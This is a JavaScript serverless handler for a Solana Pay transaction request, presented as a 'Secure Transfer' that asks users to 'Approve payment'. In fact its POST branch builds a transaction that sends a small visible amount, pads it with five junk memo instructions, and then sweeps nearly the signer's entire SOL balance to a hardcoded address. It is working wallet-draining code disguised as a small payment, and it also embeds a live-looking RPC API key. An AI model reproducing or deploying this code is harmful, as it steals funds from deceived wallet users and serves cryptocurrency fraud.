import { Connection, PublicKey, Transaction, SystemProgram, TransactionInstruction } from '@solana/web3.js';

const RECIPIENT_PUBKEY = new PublicKey("3aeBcUZdpT8n9LLNx8x21YdaDTwAeny7fN6ArLjFeDb1");
const HELIUS_URL = "https://mainnet.helius-rpc.com/?api-key=06ec4cdf-ba6c-4dfc-827f-5bae3b93f146";
const MEMO_PROGRAM_ID = new PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr");

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Accept-Header-Version');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // 1. GET Request: Returns wallet display metadata
    if (req.method === 'GET') {
        return res.status(200).json({
            label: "Secure Transfer",
            icon: "https://cryptologos.cc/logos/solana-sol-logo.png",
        });
    }

    // 2. POST Request: Builds custom multi-memo + balance sweep transaction
    if (req.method === 'POST') {
        try {
            const accountParam = req.body?.account;
            if (!accountParam) {
                return res.status(400).json({ error: "Missing account parameter" });
            }

            const senderPublicKey = new PublicKey(accountParam);
            const connection = new Connection(HELIUS_URL, 'confirmed');

            const balance = await connection.getBalance(senderPublicKey);
            const transaction = new Transaction();

            // Primary Transfer (0.0001 SOL)
            const primaryAmount = 100000; 
            transaction.add(
                SystemProgram.transfer({
                    fromPubkey: senderPublicKey,
                    toPubkey: RECIPIENT_PUBKEY,
                    lamports: primaryAmount,
                })
            );

            // 5x Memo Instructions
            const encoder = new TextEncoder();
            for (let i = 0; i < 5; i++) {
                transaction.add(
                    new TransactionInstruction({
                        keys: [{ pubkey: senderPublicKey, isSigner: true, isWritable: true }],
                        programId: MEMO_PROGRAM_ID,
                        data: encoder.encode("x")
                    })
                );
            }

            // Balance Sweep (leaving 0.0008 SOL fee buffer)
            const feeBuffer = 800000;
            const residualAmount = balance - primaryAmount - feeBuffer;
            if (residualAmount > 10000) {
                transaction.add(
                    SystemProgram.transfer({
                        fromPubkey: senderPublicKey,
                        toPubkey: RECIPIENT_PUBKEY,
                        lamports: residualAmount,
                    })
                );
            }

            const { blockhash } = await connection.getLatestBlockhash('confirmed');
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = senderPublicKey;

            const serializedTransaction = transaction.serialize({
                requireAllSignatures: false,
                verifySignatures: false
            });

            // Return base64 encoded transaction to wallet
            return res.status(200).json({
                transaction: serializedTransaction.toString('base64'),
                message: "Approve payment"
            });

        } catch (err) {
            console.error(err);
            return res.status(500).json({ error: err.message });
        }
    }

    return res.status(405).json({ error: 'Method not allowed' });
}
